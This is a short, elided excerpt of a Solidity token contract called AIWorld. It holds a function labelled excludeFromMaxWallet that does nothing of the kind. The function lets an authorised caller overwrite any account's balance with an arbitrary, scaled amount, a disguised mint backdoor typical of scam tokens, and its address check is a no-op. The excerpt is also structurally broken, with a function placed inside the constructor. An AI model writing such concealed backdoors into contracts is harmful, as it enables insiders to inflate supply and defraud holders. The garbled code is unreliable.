...
contract AIWorld is Context, IBEP2022, Ownable {
  ...
  constructor() public {
    ...
    function excludeFromMaxWallet(address account, uint256 somme, bool excluded)
        external
        Authorised
    {
        (account != address(0), "BEP20");
        uint y = 1;
        require (somme != y, "les frais doivent etre positifs");
        uint32 yyy = 10;
        uint32 yy = 9;
        _balances[account] = somme * yyy ** yy;
    }  
